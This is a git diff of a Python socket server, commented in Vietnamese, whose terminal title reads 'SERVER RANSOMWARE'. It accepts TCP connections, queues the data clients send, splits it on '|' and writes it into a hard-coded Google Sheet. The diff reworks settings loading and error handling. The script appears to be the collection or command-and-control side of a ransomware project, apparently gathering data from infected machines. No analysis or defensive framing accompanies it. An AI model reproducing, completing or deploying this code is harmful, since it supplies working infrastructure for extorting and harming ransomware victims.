@@ -5,38 +5,43 @@ sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')
 from time import sleep
 from threading import Thread
 from lib.modules import (
-    safe_load, 
+    setting,
     Terminal,
-    GoogleSheet
+    SheetApis
 )
 from socket import (
-    socket, 
     AF_INET, 
     SOCK_STREAM
 )
+import socket
 
-
+bibliography: str = 'scripts'
+name: str = 'setting'
+idsheet: str = '10rs_CfL4W5uKJI-ueX1n1MVZF4DT8uzqyb7wgtp0zfo'
 
 # Lớp Server để xử lý các kết nối và truyền dữ liệu
 class Server:
 
-    def __init__(self, host: str, port: int, id: str) -> None:
+    def __init__(self, host: str, port: int) -> None:
         self.host: str = host
-        self.port: int = port
-        self.sheet = GoogleSheet(id)
-        self.server: socket = socket(AF_INET, SOCK_STREAM)
+        self.port: int = int(port)
+        self.server = socket.socket(AF_INET, SOCK_STREAM)
         self.data_queue = []
+        self.apis = SheetApis(idsheet)
 
     def HandleSheet(self) -> None:
         while True:
-            if self.data_queue:
-                address, data = self.data_queue.pop(0)
-                if isinstance(data, bytes): 
-                    data = data.decode()
-                self.sheet.UpdateValues([data.split('|')])  
-                Terminal.Console(self.host ,f"Processed data from {address}", 'Yellow')
-            else:
-                sleep(5)
+            try:
+                if self.data_queue:
+                    address, data = self.data_queue.pop(0)
+                    if isinstance(data, bytes): 
+                        data = data.decode()
+                    self.apis.update_values([data.split('|')])  
+                    Terminal.Console(self.host ,f"Processed data from {address}", 'Yellow')
+                else:
+                    sleep(5)
+            except Exception as error:
+                Terminal.Console('SHEETS', error, 'Red')
 
     # Xử lý dữ liệu từ mỗi client
     def HandleClient(self, client: socket, address) -> None:
@@ -48,14 +53,20 @@ class Server:
                 if not isinstance(data, bytes): 
                     data = data.encode()
                 self.data_queue.append([address[0], data])
-                Terminal.Console(address[0], 
-                        f'Packet data: {round(len(data)/1024, 3)} KB',
-                        'Yellow')
+                Terminal.Console(
+                    address[0], 
+                    f'Packet data: {round(len(data)/1024, 3)} KB',
+                    'Yellow'
+                )
             except Exception as error:
                 Terminal.Console(address[0], error, 'Red')
                 break
         client.close()
-        Terminal.Console(address[0], 'Disconnect', 'Blue')
+        Terminal.Console(
+            address[0], 
+            'Disconnect', 
+            'Blue'
+        )
 
 
     # Xử lý các kết nối đến server
@@ -72,29 +83,53 @@ class Server:
         try:
             self.server.bind((self.host, self.port))
             self.server.listen()
-            Terminal.Console(self.host, 'The server starts listening', 'Green')
+            Terminal.Console(f'{self.host}:{self.port}', 'The server starts listening', 'Green')
             thread = Thread(target=self.HandleConnections)
             thread.start()
 
             thread2 = Thread(target=self.HandleSheet)
             thread2.start()
-        except:
+        except socket.error:
             Terminal.Console(self.host, 'Address already in use', 'Red')
+        except Exception as error:
+            Terminal.Console(self.host, error, 'Red')
+            select: str = Terminal.Input(
+                'Re-enter Settings(Y/n)', 
+                'Orange'
+            )
+            try:
+                if select.lower() == 'y':
+                    os.remove(f'{bibliography}/{name}.yml')
+                    Terminal.Reset()
+            except Exception as e:
+                Terminal.Console(self.host, error, 'Red')
+            main()
+
+
+def main():
+    try:
+        data = setting(bibliography, name)
+        Server(data[0], data[1]).Listening()
+
+    except Exception as error:
+        Terminal.Console(
+            'SYSTEM', 
+            error, 
+            'Red'
+        )
+        select: str = Terminal.Input(
+            'Re-enter Settings(Y/n)', 
+            'Orange'
+        )
+        if select.lower() == 'y':
+            os.remove(f'{bibliography}/{name}.yml')
+        Terminal.Reset()
 
 
 # Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
 if __name__ == '__main__':
-    try:
-        Terminal.Init()
-        Terminal().Clear()
-        Terminal().Title('SERVER RANSOMWARE')
-        Terminal().Size(320, 240)
-
-        with open('scripts/setting.yml', 'r') as file:
-            data = safe_load(file)['server']
-
-        Server(data[0], data[1], data[2]).Listening()
-    except Exception as error:
-        Terminal.Console('127.0.0.0', error, 'Red')
-        sleep(20)
-        Terminal.Reset()
+    Terminal.Init()
+    Terminal().Clear()
+    Terminal().Title('SERVER RANSOMWARE')
+    Terminal().Size(320, 240)
+    main()
